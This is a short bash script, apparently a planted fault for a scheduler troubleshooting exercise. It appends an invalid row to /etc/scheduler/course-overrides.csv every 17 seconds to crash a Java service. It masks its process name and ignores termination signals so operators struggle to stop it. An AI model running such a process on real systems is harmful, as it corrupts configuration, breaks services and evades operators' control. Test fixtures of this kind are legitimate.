#!/bin/bash
# scheduler-env-saboteur
# Appends invalid rows to /etc/scheduler/course-overrides.csv every 17 seconds.
# The OverlayApplier throws RuntimeException on unknown field names, crashing the JAR.
# comm: "scheduler-envsa" (15 chars)

exec -a scheduler-envsa bash -c '
trap "" SIGTERM SIGINT SIGHUP SIGQUIT SIGUSR1 SIGUSR2

BOGUS_ROW="CS999,priority,high"

while true; do
  if [ -f /etc/scheduler/course-overrides.csv ]; then
    printf "%s\n" "$BOGUS_ROW" >> /etc/scheduler/course-overrides.csv 2>/dev/null || true
  fi
  sleep 17
done
'
